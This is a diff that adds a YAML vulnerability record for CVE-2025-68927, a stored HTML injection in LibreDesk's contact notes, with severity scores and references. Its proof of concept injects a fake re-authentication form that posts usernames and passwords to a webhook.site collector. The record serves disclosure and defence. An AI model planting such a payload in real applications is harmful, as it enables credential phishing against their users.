@@ -1,0 +1,152 @@
+vulnerability_id: VCID-rjbh-bs9f-ffeu
+aliases:
+  - CVE-2025-68927
+  - GHSA-wh6m-h6f4-rjf4
+summary: |
+  Libredesk has Improper Neutralization of  HTML Tags in a Web Page
+  ### Summary
+
+  LibreDesk is vulnerable to **stored HTML injection** in the contact notes feature. When adding notes via `POST /api/v1/contacts/{id}/notes`, the backend automatically wraps user input in `<p>` tags. However, by intercepting the request and removing the `<p>` tag, an attacker can inject arbitrary HTML elements such as forms and images, which are then stored and rendered without proper sanitization. This can lead to phishing, CSRF-style forced actions, and UI redress attacks.
+
+  ---
+
+  ### Details
+
+  When notes are added through the LibreDesk web application, the client sends note content wrapped inside `<p>` tags. The backend appears to **trust this HTML structure** and stores the content as-is.
+
+  By intercepting the request to:
+
+  ```
+  POST /api/v1/contacts/3/notes
+  ```
+
+  and **removing the `<p>` wrapper**, an attacker can submit arbitrary HTML content. The backend does not sanitize or validate the HTML payload before persisting it.
+
+  As a result:
+
+  * Arbitrary HTML tags (e.g., `<form>`, `<input>`, `<img>`) are stored
+  * The injected HTML is rendered when the notes are viewed in the application
+  * No server-side HTML sanitization or allowlisting is enforced
+
+  This indicates that the application relies on **client-side HTML formatting assumptions**, which can be bypassed by modifying the request.
+
+  ---
+
+  ### PoC
+
+  1. Log in to LibreDesk and open any contact.
+  2. Add a note normally via the UI.
+  3. Intercept the request to:
+
+     ```
+     POST /api/v1/contacts/3/notes
+     ```
+  4. Original request body (example):
+
+     ```json
+     {
+       "note": "<p>This is a normal note</p>"
+     }
+     ```
+  5. Modify the payload by removing the `<p>` tag and injecting arbitrary HTML:
+
+     ```json
+     {
+       "note": "<form action='https://webhook.site/xxxx' method='POST'>
+                  <input type='text' name='username' placeholder='Username'>
+                  <input type='password' name='password' placeholder='Password'>
+                  <input type='submit' value='Re-authenticate'>
+                </form>"
+     }
+     ```
+
+  6. Forward the request.
+  7. View the contact note in the LibreDesk UI.
+
+  **Result:**
+  The injected HTML form is rendered inside the application.
+
+
+  ---
+
+  ### Impact
+
+  This is a **stored HTML injection** vulnerability affecting any user who can add or view contact notes.
+
+  Potential impact includes:
+
+  * Credential phishing through injected forms
+  * CSRF-style forced actions using HTML-only forms
+  * UI redress and social engineering
+  * Increased risk if notes are viewed by privileged users (e.g., admins or agents)
+
+  If the notes are shared across users or roles, this vulnerability can be abused to target multiple users, increasing severity.
+severities:
+  - score: '0.0003'
+    scoring_system: epss
+    scoring_elements: '0.0831'
+    published_at: '2026-01-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-68927
+  - score: '0.0003'
+    scoring_system: epss
+    scoring_elements: '0.08282'
+    published_at: '2026-01-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-68927
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/abhinavxd/libredesk
+  - score: '7.3'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P
+    published_at: None
+    url: https://github.com/abhinavxd/libredesk/commit/270347849943ac6a43e9fd6ebdc99c71841900eb
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/abhinavxd/libredesk/commit/270347849943ac6a43e9fd6ebdc99c71841900eb
+  - score: Track*
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:Y/T:T/P:M/B:A/M:M/D:R/2025-12-29T16:43:28Z/
+    published_at: None
+    url: https://github.com/abhinavxd/libredesk/commit/270347849943ac6a43e9fd6ebdc99c71841900eb
+  - score: '7.3'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P
+    published_at: None
+    url: https://github.com/abhinavxd/libredesk/security/advisories/GHSA-wh6m-h6f4-rjf4
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/abhinavxd/libredesk/security/advisories/GHSA-wh6m-h6f4-rjf4
+  - score: Track*
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:Y/T:T/P:M/B:A/M:M/D:R/2025-12-29T16:43:28Z/
+    published_at: None
+    url: https://github.com/abhinavxd/libredesk/security/advisories/GHSA-wh6m-h6f4-rjf4
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-68927
+weaknesses:
+  - CWE-79
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-68927
+    reference_type:
+    reference_id:
+  - url: https://github.com/abhinavxd/libredesk
+    reference_type:
+    reference_id:
+  - url: https://github.com/abhinavxd/libredesk/commit/270347849943ac6a43e9fd6ebdc99c71841900eb
+    reference_type:
+    reference_id:
+  - url: https://github.com/abhinavxd/libredesk/security/advisories/GHSA-wh6m-h6f4-rjf4
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-68927
+    reference_type:
+    reference_id:
